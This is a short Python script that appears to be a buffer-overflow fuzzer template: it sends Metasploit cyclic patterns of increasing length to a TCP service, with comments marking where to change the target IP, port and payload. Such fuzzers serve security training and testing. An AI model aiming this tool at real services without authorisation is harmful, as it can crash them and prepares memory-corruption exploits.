#!/usr/bin/python

import socket
import subprocess

BUFFER_INCREM=100
FUZZ_LOOPS=30

buffer_content = str()
buffer_char_count = 100
iterations = 0

def pattern_create(pattern,buffer_len):
	obtain_pattern = subprocess.Popen(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb", "-l", str(buffer_len)], stdout=subprocess.PIPE)
	pattern = (obtain_pattern.communicate()[0]).strip('\n')
	return pattern

def fuzz(pattern):
	payload = pattern # <------------------------------------------- CHANGE PAYLOAD
	print("Sending %s bytes." % len(pattern))
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('127.0.0.1',4444)) # <------------------------------- CHANGE IP AND PORT NUMBER
	s.send(payload) # <--------------------------------------------- CHANGE HOW PAYLOAD IS SENT
	#s.recv(1024)
	s.close()

while iterations <= FUZZ_LOOPS:
	buffer_content = pattern_create(buffer_content,buffer_char_count)
	fuzz(buffer_content)
	buffer_char_count += BUFFER_INCREM
	iterations += 1
